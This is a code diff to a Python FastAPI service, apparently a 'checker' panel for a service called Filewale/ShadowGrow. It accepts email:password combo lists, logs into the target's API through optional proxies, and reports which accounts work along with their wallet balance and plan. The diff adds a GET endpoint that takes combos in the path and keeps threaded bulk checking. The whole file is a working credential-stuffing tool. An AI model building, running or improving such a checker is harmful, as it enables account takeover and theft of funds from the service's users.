@@ -6,8 +6,9 @@ Single + bulk account checks. Returns wallet, plan, expiry.
 
 import os
 import time
-from typing import Optional, List, Dict, Any
+from typing import Optional, List, Any
 from datetime import datetime, timezone
+from concurrent.futures import ThreadPoolExecutor
 
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel, Field
@@ -88,14 +89,19 @@ class BulkResponse(BaseModel):
     results: List[CheckResponse]
 
 # ==================== HELPERS ====================
+def _to_float(v):
+    try:
+        return float(v)
+    except Exception:
+        return None
+
 def _days_left(plan_end: Optional[str]) -> Optional[int]:
     if not plan_end:
         return None
     try:
         end = datetime.fromisoformat(plan_end.replace("Z", "+00:00"))
         now = datetime.now(timezone.utc)
-        delta = (end - now).days
-        return max(0, delta)
+        return max(0, (end - now).days)
     except Exception:
         return None
 
@@ -127,7 +133,6 @@ def _check(email: str, password: str, proxy: Optional[str] = None) -> CheckRespo
             error=f"net_{type(e).__name__}"
         )
 
-    # 401 / 403 → bad creds
     if r.status_code in (401, 403):
         s.close()
         return CheckResponse(success=False, combo=combo, status="bad",
@@ -159,7 +164,7 @@ def _check(email: str, password: str, proxy: Optional[str] = None) -> CheckRespo
     user = (body.get("data") or {}).get("user") or {}
     auth = {"authorization": f"Bearer {token}"}
 
-    # ---- verify via /users/me ----
+    # ---- verify token ----
     try:
         ru = s.get(API + "/users/me", headers={
             **auth,
@@ -178,7 +183,7 @@ def _check(email: str, password: str, proxy: Optional[str] = None) -> CheckRespo
     except Exception:
         pass
 
-    # ---- balance ----
+    # ---- wallet ----
     wallet = WalletInfo()
     try:
         rb = s.get(API + "/wallet/me/balance", headers={
@@ -268,21 +273,27 @@ def _check(email: str, password: str, proxy: Optional[str] = None) -> CheckRespo
         hit_reasons=reasons,
     )
 
-def _to_float(v):
-    try:
-        return float(v)
-    except Exception:
-        return None
-
 # ==================== APP ====================
 app = FastAPI(title="Filewale / ShadowGrow API", version="1.0.0")
 
 @app.get("/health")
 def health():
-    return {"status": "ok", "panel": PANEL_NAME, "time": datetime.utcnow().isoformat()}
+    return {"status": "ok", "panel": PANEL_NAME,
+            "time": datetime.utcnow().isoformat()}
 
+# GET — combo in path, proxy optional via query
+@app.get("/check/{combo:path}", response_model=CheckResponse)
+def check_get(combo: str, proxy: Optional[str] = None):
+    if ":" not in combo:
+        raise HTTPException(400, "combo must be email:password")
+    email, _, password = combo.partition(":")
+    if not email or not password:
+        raise HTTPException(400, "empty email or password")
+    return _check(email.strip(), password.strip(), proxy=proxy)
+
+# POST — combo in body
 @app.post("/check", response_model=CheckResponse)
-def check(req: CheckRequest):
+def check_post(req: CheckRequest):
     if ":" not in req.combo:
         raise HTTPException(400, "combo must be email:password")
     email, _, password = req.combo.partition(":")
@@ -290,10 +301,9 @@ def check(req: CheckRequest):
         raise HTTPException(400, "empty email or password")
     return _check(email.strip(), password.strip(), proxy=req.proxy)
 
+# Bulk
 @app.post("/bulk", response_model=BulkResponse)
 def bulk(req: BulkRequest):
-    from concurrent.futures import ThreadPoolExecutor
-
     cleaned = []
     for c in req.combos:
         c = c.strip()
@@ -301,7 +311,7 @@ def bulk(req: BulkRequest):
             continue
         u, _, p = c.partition(":")
         if u and p:
-            cleaned.append((u.strip(), p.strip(), c))
+            cleaned.append((u.strip(), p.strip()))
 
     if not cleaned:
         raise HTTPException(400, "no valid combos")
@@ -310,7 +320,7 @@ def bulk(req: BulkRequest):
     results: List[CheckResponse] = []
 
     with ThreadPoolExecutor(max_workers=req.threads) as ex:
-        futures = [ex.submit(_check, u, p, req.proxy) for u, p, _ in cleaned]
+        futures = [ex.submit(_check, u, p, req.proxy) for u, p in cleaned]
         for f in futures:
             results.append(f.result())
 
@@ -327,6 +337,8 @@ def bulk(req: BulkRequest):
         results=results,
     )
 
+# ==================== ENTRY ====================
 if __name__ == "__main__":
     import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("FW_PORT", "8000")))
+    port = int(os.getenv("PORT", os.getenv("FW_PORT", "8000")))
+    uvicorn.run(app, host="0.0.0.0", port=port)
